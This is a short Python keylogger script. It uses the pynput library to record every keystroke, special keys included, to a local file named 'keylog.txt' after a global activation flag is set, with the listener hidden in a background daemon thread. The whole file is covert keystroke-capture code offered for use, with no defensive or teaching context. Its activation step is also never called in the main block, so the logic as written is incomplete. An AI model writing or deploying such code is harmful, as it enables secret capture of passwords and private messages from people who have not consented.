from pynput import keyboard
import threading
import time

# Global flag to start logging
logging_active = False
LOG_FILE = "keylog.txt"

def start_logging():
    """
    Function to log keys. Only logs when logging_active is True.
    """
    def on_press(key):
        if logging_active:
            try:
                with open(LOG_FILE, "a") as file:
                    file.write(f"{key.char}")
            except AttributeError:  # Special keys
                with open(LOG_FILE, "a") as file:
                    file.write(f"[{key}]")

    # Start the key listener
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Function to activate logging
def activate_logging():
    global logging_active
    logging_active = True
    print("Keylogging activated.")

# Function to listen for the activation trigger
def listen_for_trigger():
    global logging_active
    print("Waiting for activation...")
    while not logging_active:
        time.sleep(1)  # Simulate waiting for activation

if __name__ == "__main__":
    # Start the keylogger in a separate thread
    keylogger_thread = threading.Thread(target=start_logging, daemon=True)
    keylogger_thread.start()

    # Simulate listening for activation
    listen_for_trigger()
